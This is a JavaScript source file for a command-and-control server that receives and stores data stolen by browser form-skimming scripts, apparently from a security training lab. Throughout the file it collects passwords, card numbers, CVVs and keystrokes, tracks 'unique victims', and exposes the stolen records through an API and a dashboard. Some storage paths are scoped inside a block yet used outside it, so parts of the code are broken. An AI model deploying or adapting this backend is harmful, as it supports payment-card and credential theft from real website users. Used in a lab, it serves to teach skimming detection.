/**
 * C2-SERVER.JS - ENHANCED COMMAND & CONTROL SERVER
 *
 * Handles data collection from DOM-based skimming attacks with intelligent storage:
 * - Automatic storage mode detection (local vs cloud)
 * - Smart aggregation for Cloud Storage deployments
 * - Transparent caching for optimal dashboard performance
 * - Multi-lab isolation and batch optimization
 * - Labs simply POST to /collect - all storage complexity handled here
 *
 * FOR EDUCATIONAL PURPOSES ONLY
 */

const express = require('express')
const cors = require('cors')
const fs = require('fs')
const path = require('path')

// Conditional Cloud Storage imports
let CloudStorageAdapter, SmartAggregationAdapter
try {
  CloudStorageAdapter = require('./cloud-storage-adapter')
  SmartAggregationAdapter = require('./smart-aggregation-adapter')
} catch (e) {
  // Cloud Storage not available - will use local storage
}

const app = express()
const PORT = process.env.C2_STANDALONE === 'true' ? (process.env.PORT || 8080) : 3000

// Storage mode detection
const STORAGE_MODE = process.env.STORAGE_MODE || detectStorageMode()
const CLOUD_RUN_ENV = process.env.K_SERVICE !== undefined // Detect Cloud Run

function detectStorageMode() {
  // Auto-detect based on environment
  if (CLOUD_RUN_ENV && SmartAggregationAdapter) {
    return 'cloud'
  }
  return 'local'
}

// Initialize storage adapter based on mode - C2 server owns all storage complexity
let storageAdapter
if (STORAGE_MODE === 'cloud' && SmartAggregationAdapter) {
  storageAdapter = new SmartAggregationAdapter({
    labId: process.env.LAB_ID || 'lab2-dom-skimming',
    bucketName: process.env.C2_STORAGE_BUCKET,
    // Optimized for dashboard performance
    batchWindowMinutes: parseInt(process.env.BATCH_WINDOW_MINUTES) || 60, // 1-hour batches
    cacheTtlMinutes: parseInt(process.env.CACHE_TTL_MINUTES) || 5, // 5-minute cache
    maxBatchSize: parseInt(process.env.MAX_BATCH_SIZE) || 500, // 500 attacks per batch
    logger: {
      log: (msg) => console.log(`[SmartAggregation] ${msg}`),
      error: (msg, err) => console.error(`[SmartAggregation] ${msg}`, err),
      warn: (msg, err) => console.warn(`[SmartAggregation] ${msg}`, err)
    }
  })
  console.log(`[C2-Server] Using Smart Aggregation mode (bucket: ${process.env.C2_STORAGE_BUCKET}, batch window: ${storageAdapter.batchConfig.batchWindowMinutes}min)`)
} else if (STORAGE_MODE === 'cloud' && CloudStorageAdapter) {
  // Fallback to basic cloud storage
  storageAdapter = new CloudStorageAdapter({
    labId: process.env.LAB_ID || 'lab2-dom-skimming',
    bucketName: process.env.C2_STORAGE_BUCKET,
    logger: {
      log: (msg) => console.log(`[CloudStorage] ${msg}`),
      error: (msg, err) => console.error(`[CloudStorage] ${msg}`, err),
      warn: (msg, err) => console.warn(`[CloudStorage] ${msg}`, err)
    }
  })
  console.log(`[C2-Server] Using Basic Cloud Storage mode (bucket: ${process.env.C2_STORAGE_BUCKET})`)
} else {
  // Fallback to local storage
  const DATA_DIR = path.join(__dirname, 'stolen-data')
  const ANALYSIS_DIR = path.join(__dirname, 'analysis')
  const STOLEN_FILE = path.join(DATA_DIR, 'stolen.json')

  // Ensure directories exist
  ;[DATA_DIR, ANALYSIS_DIR].forEach(dir => {
    if (!fs.existsSync(dir)) {
      fs.mkdirSync(dir, { recursive: true })
    }
  })

  console.log(`[C2-Server] Using local storage mode (${CLOUD_RUN_ENV ? 'WARNING: Cloud Run detected but cloud storage not available' : 'container environment'})`)
}

// Attack statistics tracking
let attackStatistics = {
  totalRequests: 0,
  domMonitorSessions: 0,
  formOverlayCaptures: 0,
  shadowDomCaptures: 0,
  uniqueVictims: new Set(),
  startTime: Date.now(),
  storageMode: STORAGE_MODE
}

// Middleware
app.use(cors())
app.use(express.json({ limit: '10mb' }))
app.use(express.urlencoded({ extended: true, limit: '10mb' }))

// sendBeacon content-type handler
app.use((req, res, next) => {
  if (req.method === 'POST' && req.is('text/plain') && !req.body) {
    let raw = ''
    req.on('data', chunk => { raw += chunk })
    req.on('end', () => {
      try { req.body = JSON.parse(raw) } catch (_) { req.body = {} }
      next()
    })
  } else {
    next()
  }
})

/**
 * Storage abstraction layer - Labs just POST to /collect, C2 handles storage complexity
 */
async function saveAttackData(attackType, data) {
  if (storageAdapter && STORAGE_MODE === 'cloud') {
    return await storageAdapter.saveAttackData(attackType, data)
  } else {
    return saveAttackDataLocal(attackType, data)
  }
}

function saveAttackDataLocal(attackType, data) {
  const enrichedData = {
    ...data,
    serverTimestamp: Date.now(),
    serverTime: new Date().toISOString(),
    attackType
  }

  let existing = []
  if (fs.existsSync(STOLEN_FILE)) {
    try {
      existing = JSON.parse(fs.readFileSync(STOLEN_FILE, 'utf8'))
      if (!Array.isArray(existing)) existing = []
    } catch (e) {
      console.warn('[LocalStorage] stolen.json corrupt, resetting to empty array')
      existing = []
    }
  }

  existing.push(enrichedData)
  fs.writeFileSync(STOLEN_FILE, JSON.stringify(existing, null, 2))
  console.log('[LocalStorage] Attack data appended to stolen.json')

  return STOLEN_FILE
}

async function getRecentAttacks(count = 100) {
  if (storageAdapter && STORAGE_MODE === 'cloud') {
    return await storageAdapter.getRecentAttacks(count)
  } else {
    return getRecentAttacksLocal()
  }
}

function getRecentAttacksLocal() {
  try {
    if (!fs.existsSync(STOLEN_FILE)) {
      return []
    }
    const data = JSON.parse(fs.readFileSync(STOLEN_FILE, 'utf8'))
    return Array.isArray(data) ? data : []
  } catch (error) {
    console.error('[LocalStorage] Error reading stolen data:', error.message)
    return []
  }
}

async function saveAnalysis(analysis) {
  if (storageAdapter && STORAGE_MODE === 'cloud') {
    return await storageAdapter.saveAnalysis(analysis)
  } else {
    const analysisPath = path.join(ANALYSIS_DIR, `analysis_${Date.now()}.json`)
    fs.writeFileSync(analysisPath, JSON.stringify(analysis, null, 2))
    return analysisPath
  }
}


// Utility functions
function sanitizeForLog(input) {
  if (typeof input !== 'string') input = String(input)
  return input.replace(/[\r\n\t\x00-\x1f\x7f]/g, ' ').substring(0, 500)
}

function logToConsole(level, message, data = null) {
  const timestamp = new Date().toISOString()
  const safeMessage = sanitizeForLog(message)
  const logEntry = `[${timestamp}] [${level.toUpperCase()}] [C2-Server] ${safeMessage}`
  console.log(logEntry)
  if (data) {
    console.log('  Data:', JSON.stringify(data, null, 2))
  }
}

function generateSessionId() {
  return 'session_' + Date.now() + '_' + Math.random().toString(36).substring(2, 11)
}

// Analysis functions
function analyzeAttackData(data) {
  const analysis = {
    timestamp: Date.now(),
    attackType: data.type || 'unknown',
    severity: 'medium',
    indicators: [],
    riskScore: 0
  }

  switch (data.type) {
    case 'periodic':
    case 'immediate':
    case 'session_end':
    case 'form_submission': // New optimized attack type
      analysis.attackType = 'dom-monitor'
      analysis.severity = assessDomMonitorSeverity(data)
      analysis.indicators = extractDomMonitorIndicators(data)
      break
    case 'form_overlay_capture':
      analysis.attackType = 'form-overlay'
      analysis.severity = assessFormOverlaySeverity(data)
      analysis.indicators = extractFormOverlayIndicators(data)
      break
    case 'shadow_dom_capture':
    case 'shadow_session_end':
      analysis.attackType = 'shadow-dom'
      analysis.severity = assessShadowDomSeverity(data)
      analysis.indicators = extractShadowDomIndicators(data)
      break
  }

  analysis.riskScore = calculateRiskScore(analysis)
  return analysis
}

function assessDomMonitorSeverity(data) {
  // Handle both old periodic format and new form_submission format
  if (data.type === 'form_submission' && data.formData) {
    const fieldCount = Object.keys(data.formData).length
    const highValueFields = Object.values(data.formData).filter(f => f.isHighValue).length

    if (highValueFields > 3 || fieldCount > 8) return 'critical'
    if (highValueFields > 1 || fieldCount > 5) return 'high'
    if (highValueFields > 0 || fieldCount > 2) return 'medium'
  }

  // Legacy format
  if (data.summary) {
    const keystrokeCount = data.summary.keystrokesCount || 0
    const fieldCount = data.summary.fieldsCount || 0
    if (keystrokeCount > 100 || fieldCount > 5) return 'high'
    if (keystrokeCount > 20 || fieldCount > 2) return 'medium'
  }

  return 'low'
}

function assessFormOverlaySeverity(data) {
  if (data.data && data.data.credentials) {
    const credentialFields = Object.keys(data.data.credentials)
    const hasPassword = credentialFields.some(field => field.includes('password'))
    const hasCard = credentialFields.some(field => field.includes('card') || field.includes('cvv'))

    if (hasPassword && hasCard) return 'critical'
    if (hasPassword || hasCard) return 'high'
    if (credentialFields.length > 3) return 'medium'
  }
  return 'low'
}

function assessShadowDomSeverity(data) {
  if (data.sessions) {
    const sessionCount = data.sessions.length
    const hasKeystrokes = data.sessions.some(
      s => s.capturedKeystrokes && s.capturedKeystrokes.length > 0
    )

    if (sessionCount > 5 && hasKeystrokes) return 'high'
    if (sessionCount > 2 || hasKeystrokes) return 'medium'
  }
  return 'low'
}

function extractDomMonitorIndicators(data) {
  const indicators = ['DOM MutationObserver usage', 'Real-time field monitoring']

  if (data.type === 'form_submission') {
    indicators.push('Form submission interception')
    if (data.formStats && data.formStats.highValueFields > 0) {
      indicators.push(`High-value field capture (${data.formStats.highValueFields} fields)`)
    }
  }

  if (data.summary && data.summary.keystrokesCount > 0) {
    indicators.push('Keystroke logging detected')
  }

  return indicators
}

function extractFormOverlayIndicators(data) {
  const indicators = ['Dynamic form overlay injection', 'Credential harvesting']

  if (data.data && data.data.formType) {
    indicators.push(`Target form type: ${data.data.formType}`)
  }

  if (data.metadata && data.metadata.injectionAttempts > 1) {
    indicators.push('Multiple injection attempts')
  }

  return indicators
}

function extractShadowDomIndicators(data) {
  const indicators = ['Shadow DOM encapsulation abuse', 'Cross-boundary monitoring']

  if (data.shadowInfo) {
    if (data.shadowInfo.mode === 'closed') {
      indicators.push('Closed shadow DOM usage')
    }
    if (data.shadowInfo.maxDepth > 1) {
      indicators.push('Nested shadow DOM structure')
    }
  }

  return indicators
}

function calculateRiskScore(analysis) {
  let score = 0

  // Base score by severity
  switch (analysis.severity) {
    case 'critical':
      score += 90
      break
    case 'high':
      score += 70
      break
    case 'medium':
      score += 50
      break
    case 'low':
      score += 20
      break
  }

  // Additional points for indicators
  score += analysis.indicators.length * 5

  // Cap at 100
  return Math.min(score, 100)
}

function updateStatistics(data) {
  attackStatistics.totalRequests++
  const victimId = data.metadata?.userAgent || 'unknown'
  attackStatistics.uniqueVictims.add(victimId)

  switch (data.type) {
    case 'periodic':
    case 'immediate':
    case 'session_end':
    case 'form_submission':
      attackStatistics.domMonitorSessions++
      break
    case 'form_overlay_capture':
      attackStatistics.formOverlayCaptures++
      break
    case 'shadow_dom_capture':
    case 'shadow_session_end':
      attackStatistics.shadowDomCaptures++
      break
  }
}

/**
 * API Endpoints
 */

// Main data collection endpoint
// Main data collection endpoint - Labs POST here, C2 handles all storage complexity
app.post('/collect', async (req, res) => {
  try {
    const attackData = req.body
    const clientIp = sanitizeForLog(req.ip || req.connection.remoteAddress || 'unknown')

    logToConsole('info', `Received attack data from ${clientIp}`, {
      type: sanitizeForLog(attackData.type || 'unknown'),
      timestamp: attackData.timestamp,
      size: JSON.stringify(attackData).length,
      storageMode: STORAGE_MODE
    })

    updateStatistics(attackData)
    const analysis = analyzeAttackData(attackData)

    // Save data asynchronously - C2 server handles all storage logic
    const [savedPath] = await Promise.all([
      saveAttackData(analysis.attackType, attackData),
      saveAnalysis(analysis)
    ])

    if (analysis.severity === 'high' || analysis.severity === 'critical') {
      logToConsole('warn', `HIGH SEVERITY ATTACK DETECTED: ${analysis.attackType}`, {
        severity: analysis.severity,
        riskScore: analysis.riskScore,
        indicators: analysis.indicators
      })
    }

    res.json({
      success: true,
      sessionId: generateSessionId(),
      timestamp: Date.now(),
      storageMode: STORAGE_MODE,
      analysis: {
        severity: analysis.severity,
        riskScore: analysis.riskScore
      }
    })
  } catch (error) {
    logToConsole('error', 'Error processing attack data', { error: error.message })
    res.status(500).json({
      success: false,
      error: 'Server error processing data'
    })
  }
})

// Get attack statistics (enhanced for smart aggregation)
app.get('/stats', async (req, res) => {
  try {
    // If using smart aggregation, get optimized stats
    if (storageAdapter && storageAdapter.getStatsSummary) {
      const cloudStats = await storageAdapter.getStatsSummary()

      const stats = {
        ...attackStatistics,
        // Merge with cloud storage stats
        totalRequests: Math.max(attackStatistics.totalRequests, cloudStats.totalAttacks || 0),
        uniqueVictims: Math.max(attackStatistics.uniqueVictims.size, cloudStats.uniqueVictims || 0),
        // Cloud-specific metrics
        cardDataCaptures: cloudStats.cardDataCount || 0,
        formSubmissions: cloudStats.formSubmissionCount || 0,
        activeDays: cloudStats.activeDays || 0,
        lastUpdate: cloudStats.lastUpdate,
        uptime: Date.now() - attackStatistics.startTime,
        uptimeHours: Math.round(((Date.now() - attackStatistics.startTime) / (1000 * 60 * 60)) * 100) / 100,
        storageMode: STORAGE_MODE,
        cacheStatus: 'optimized'
      }

      // Convert Set to number for JSON response
      stats.uniqueVictims = typeof stats.uniqueVictims === 'number' ? stats.uniqueVictims : stats.uniqueVictims.size || 0

      res.json(stats)
    } else {
      // Fallback to in-memory stats
      const stats = {
        ...attackStatistics,
        uniqueVictims: attackStatistics.uniqueVictims.size,
        uptime: Date.now() - attackStatistics.startTime,
        uptimeHours: Math.round(((Date.now() - attackStatistics.startTime) / (1000 * 60 * 60)) * 100) / 100,
        storageMode: STORAGE_MODE,
        cacheStatus: 'in-memory'
      }
      res.json(stats)
    }
  } catch (error) {
    console.error('[C2-Server] Error getting stats:', error.message)
    // Fallback to basic stats on error
    const stats = {
      ...attackStatistics,
      uniqueVictims: attackStatistics.uniqueVictims.size,
      uptime: Date.now() - attackStatistics.startTime,
      uptimeHours: Math.round(((Date.now() - attackStatistics.startTime) / (1000 * 60 * 60)) * 100) / 100,
      storageMode: STORAGE_MODE,
      cacheStatus: 'error',
      error: error.message
    }
    res.json(stats)
  }
})

// Get all stolen data (async-compatible)
app.get('/api/stolen', async (req, res) => {
  try {
    const data = await getRecentAttacks(1000) // Get more for compatibility
    res.json(data)
  } catch (error) {
    logToConsole('error', 'Error fetching stolen data', { error: error.message })
    res.status(500).json({ error: 'Error fetching data' })
  }
})

// Get recent attack data (metadata only)
app.get('/recent/:count?', (req, res) => {
  try {
    const count = parseInt(req.params.count) || 10
    const files = fs
      .readdirSync(DATA_DIR)
      .filter(file => file.endsWith('.json'))
      .sort((a, b) => {
        const statA = fs.statSync(path.join(DATA_DIR, a))
        const statB = fs.statSync(path.join(DATA_DIR, b))
        return statB.mtime - statA.mtime
      })
      .slice(0, count)

    const recentAttacks = files.map(file => {
      const filepath = path.join(DATA_DIR, file)
      const data = JSON.parse(fs.readFileSync(filepath, 'utf8'))
      return {
        filename: file,
        timestamp: data.serverTimestamp || data.timestamp,
        type: data.type,
        attackType: data.attackType,
        size: fs.statSync(filepath).size
      }
    })

    res.json(recentAttacks)
  } catch (error) {
    logToConsole('error', 'Error fetching recent attacks', { error: error.message })
    res.status(500).json({ error: 'Error fetching data' })
  }
})

// Get specific attack data
app.get('/attack/:filename', (req, res) => {
  try {
    const filename = req.params.filename

    // Security: Prevent path traversal attacks
    // Only allow alphanumeric, hyphens, underscores, and dots in filename
    if (!/^[a-zA-Z0-9._-]+$/.test(filename) || filename.includes('..')) {
      return res.status(400).json({ error: 'Invalid filename' })
    }

    // Use path.basename to strip any directory separators
    const safeFilename = path.basename(filename)
    const filepath = path.join(DATA_DIR, safeFilename)

    // Verify the resolved path is within DATA_DIR (prevent path traversal)
    const resolvedPath = path.resolve(filepath)
    const resolvedDataDir = path.resolve(DATA_DIR)
    if (!resolvedPath.startsWith(resolvedDataDir)) {
      return res.status(403).json({ error: 'Access denied' })
    }

    if (!fs.existsSync(filepath)) {
      return res.status(404).json({ error: 'Attack data not found' })
    }

    const data = JSON.parse(fs.readFileSync(filepath, 'utf8'))
    res.json(data)
  } catch (error) {
    logToConsole('error', 'Error fetching attack data', { error: error.message })
    res.status(500).json({ error: 'Error reading attack data' })
  }
})

// Get analysis for specific attack
app.get('/analysis/:filename', (req, res) => {
  try {
    const filename = req.params.filename

    // Security: Prevent path traversal attacks
    // Only allow alphanumeric, hyphens, underscores, and dots in filename
    if (!/^[a-zA-Z0-9._-]+$/.test(filename) || filename.includes('..')) {
      return res.status(400).json({ error: 'Invalid filename' })
    }

    // Use path.basename to strip any directory separators
    const safeFilename = path.basename(filename)
    const analysisPath = path.join(ANALYSIS_DIR, `analysis_${safeFilename}`)

    // Verify the resolved path is within ANALYSIS_DIR (prevent path traversal)
    const resolvedPath = path.resolve(analysisPath)
    const resolvedAnalysisDir = path.resolve(ANALYSIS_DIR)
    if (!resolvedPath.startsWith(resolvedAnalysisDir)) {
      return res.status(403).json({ error: 'Access denied' })
    }

    if (!fs.existsSync(analysisPath)) {
      return res.status(404).json({ error: 'Analysis not found' })
    }

    const analysis = JSON.parse(fs.readFileSync(analysisPath, 'utf8'))
    res.json(analysis)
  } catch (error) {
    logToConsole('error', 'Error fetching analysis', { error: error.message })
    res.status(500).json({ error: 'Error reading analysis' })
  }
})

// Dashboard endpoint - serves the main dashboard
app.get('/', async (req, res) => {
  try {
    const dashboardPath = path.join(__dirname, 'dashboard.html')
    const dashboard = fs.readFileSync(dashboardPath, 'utf8')
    res.send(dashboard)
  } catch (error) {
    console.error('[C2] Failed to serve dashboard:', error)
    res.status(500).send('Dashboard not available')
  }
})

// Also serve dashboard at /stolen-data for nginx proxy
app.get('/stolen-data', async (req, res) => {
  try {
    const dashboardPath = path.join(__dirname, 'dashboard.html')
    const dashboard = fs.readFileSync(dashboardPath, 'utf8')
    res.send(dashboard)
  } catch (error) {
    console.error('[C2] Failed to serve dashboard:', error)
    res.status(500).send('Dashboard not available')
  }
})

// Health check endpoint
// Health check endpoint (enhanced for cloud storage)
app.get('/health', async (req, res) => {
  const health = {
    status: 'healthy',
    timestamp: Date.now(),
    storageMode: STORAGE_MODE,
    environment: CLOUD_RUN_ENV ? 'cloud-run' : 'container'
  }

  if (storageAdapter && STORAGE_MODE === 'cloud') {
    try {
      const storageHealth = await storageAdapter.healthCheck()
      health.storage = storageHealth
    } catch (error) {
      health.storage = { status: 'unhealthy', error: error.message }
      health.status = 'degraded'
    }
  }

  res.json(health)
})

// Clear all stored data (for testing)
app.post('/clear', (req, res) => {
  try {
    // Clear data files
    const dataFiles = fs.readdirSync(DATA_DIR)
    dataFiles.forEach(file => {
      fs.unlinkSync(path.join(DATA_DIR, file))
    })

    // Clear analysis files
    const analysisFiles = fs.readdirSync(ANALYSIS_DIR)
    analysisFiles.forEach(file => {
      fs.unlinkSync(path.join(ANALYSIS_DIR, file))
    })

    // Reset statistics
    attackStatistics = {
      totalRequests: 0,
      domMonitorSessions: 0,
      formOverlayCaptures: 0,
      shadowDomCaptures: 0,
      uniqueVictims: new Set(),
      startTime: Date.now()
    }

    logToConsole('info', 'All stored data cleared')
    res.json({ success: true, message: 'All data cleared' })
  } catch (error) {
    logToConsole('error', 'Error clearing data', { error: error.message })
    res.status(500).json({ error: 'Error clearing data' })
  }
})

// Error handling middleware
app.use((error, req, res, next) => {
  logToConsole('error', 'Unhandled error', { error: error.message, stack: error.stack })
  res.status(500).json({ error: 'Internal server error' })
})

// 404 handler
app.use((req, res) => {
  res.status(404).json({ error: 'Endpoint not found' })
})

// Graceful shutdown handling
process.on('SIGTERM', async () => {
  console.log('[C2-Server] Received SIGTERM, shutting down gracefully...')
  if (storageAdapter && storageAdapter.cleanup) {
    await storageAdapter.cleanup()
  }
  process.exit(0)
})

app.listen(PORT, () => {
  logToConsole('info', `C2 Server running on port ${PORT}`, {
    storageMode: STORAGE_MODE,
    environment: CLOUD_RUN_ENV ? 'cloud-run' : 'container',
    bucket: process.env.C2_STORAGE_BUCKET || 'N/A'
  })
})

module.exports = app

/**
 * C2 SERVER ANALYSIS:
 *
 * This C2 server provides comprehensive handling for DOM-based attacks:
 *
 * 1. **Multi-Attack Support**:
 *    - DOM Monitor real-time field monitoring
 *    - Form Overlay credential harvesting
 *    - Shadow DOM stealth operations
 *    - Cross-attack correlation
 *
 * 2. **Real-Time Analysis**:
 *    - Automatic severity assessment
 *    - Risk score calculation
 *    - Indicator extraction
 *    - Pattern recognition
 *
 * 3. **Data Management**:
 *    - Structured data storage
 *    - Analysis persistence
 *    - Attack statistics tracking
 *    - Victim correlation
 *
 * 4. **Monitoring Capabilities**:
 *    - Real-time attack statistics
 *    - Historical data access
 *    - Severity-based alerting
 *    - Performance tracking
 *
 * 5. **Educational Features**:
 *    - Clear attack categorization
 *    - Detailed analysis output
 *    - Pattern documentation
 *    - Testing utilities
 *
 * This server enables comprehensive analysis of DOM-based skimming
 * techniques for security research and ML training purposes.
 */
